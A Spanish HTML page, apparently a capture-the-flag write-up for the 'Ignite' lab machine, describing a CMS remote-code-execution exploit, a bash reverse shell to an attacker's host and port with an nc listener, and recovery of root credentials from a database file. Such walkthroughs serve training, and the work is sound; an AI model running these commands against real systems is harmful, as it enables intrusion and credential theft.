@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flash</title>
+    <link rel="stylesheet" href="../../pagesmach.css">
+    <link rel="icon" href="../../img/vulnyx.ico" type="image/x-icon">
+</head>
+<body>
+    <div class="contenedor">
+        <h1>IGNITE</h1>
+        <div class="text-img">
+            <img src="img/Ignite/logo.png" alt="" class="img-principal">
+            <p class="text">Esta maquina presenta lo siguiente:</p>
+            <img src="img/Ignite/1.png" alt="" class="img-sec">
+            <p>Se ve los siguientes puertos abiertos:
+                <br>
+                80
+                <br>
+                Y vemos que es un posible CMS <br> 
+                Asi que verificamos la pagina
+            </p>
+            <img src="img/Ignite/2.png" alt="" class="img-sec">
+            <p>Vemos que efectivamente es un CMS</p>
+            <p>Procedemos a buscar vulnerabilidades con searchsploit</p>
+            <img src="img/Ignite/3.png" alt="" class="img-sec">
+            <p>Efectivamente tenemos una vulnerabilidad de Ejecucion remota de codigo y Descargamos</p>
+            <img src="img/Ignite/4.png" alt="" class="img-sec">
+            <p>Y ejecutamos:</p>
+            <div class="card">
+                <div class="tools">
+                  <div class="circle">
+                    <span class="red box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="yellow box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="green box"></span>
+                  </div>
+                </div>
+                <div class="card__content">
+                    <pre><span>python 50477.py -u http://IP/</span></pre>
+                </div>
+              </div>
+              <img src="img/Ignite/5.png" alt="" class="img-sec">
+              <p>Vemos de que ya podemos ejecutar comandos como whoami <br>Procedemos a ejecutar la reverseshell:</p>
+            <div class="card">
+                <div class="tools">
+                  <div class="circle">
+                    <span class="red box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="yellow box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="green box"></span>
+                  </div>
+                </div>
+                <div class="card__content">
+                    <pre><span>bash -c "bash -i >& /dev/tcp/IP atacante/puerto 0>&1"</span></span></span></pre>
+                </div>
+              </div>
+            <p>Y nos colocamos a la escucha:</p>
+            <div class="card">
+                <div class="tools">
+                  <div class="circle">
+                    <span class="red box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="yellow box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="green box"></span>
+                  </div>
+                </div>
+                <div class="card__content">
+                    <pre><span>nc -lvnp"puerto"</span></pre>
+                </div>
+              </div>
+            <img src="img/Ignite/7.png" alt="" class="img-sec">
+            <p>Probamos y efectivamente ya estamos dentro <br>Y verificamos la carpeta de home </p>
+            <img src="img/Ignite/8.png" alt="" class="img-sec">
+            <p>Procedemos a hacer elevacion de privilegios</p>
+            <img src="img/Ignite/9.png" alt="" class="img-sec">
+            <p>En la pagina principar vimos que hay un archivo de base de datos puede ser que las credenciales esten ahi.</p>
+            <div class="card">
+                <div class="tools">
+                  <div class="circle">
+                    <span class="red box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="yellow box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="green box"></span>
+                  </div>
+                </div>
+                <div class="card__content">
+                    <pre><span>find / -name database.php 2>/dev/null</span></span></pre>
+                </div>
+              </div>
+            <img src="img/Ignite/10.png" alt="" class="img-sec">
+            <p>Y lo encontramos asi que usamos strings</p>
+            <img src="img/Ignite/11.png" alt="" class="img-sec">
+            <p>Procedemos a buscar user y password</p>
+            <img src="img/Ignite/12.png" alt="" class="img-sec">
+            <p>Y encontramos el usuario root con su contraseña</p>
+            <img src="img/Ignite/13.png" alt="" class="img-sec">
+            <p>Y efectivamente funciono con eso completamos la maquina.</p>
+        </div>
+    </div>
+    <div class="loader" id="loader">
+      <div data-glitch="Loading..." class="glitch">Loading...</div>
+   </div>
+    <script>
+      window.addEventListener("load", function(){
+        document.getElementById("loader").classList.toggle("loading");
+      })
+    </script>
+</body>
+</html>
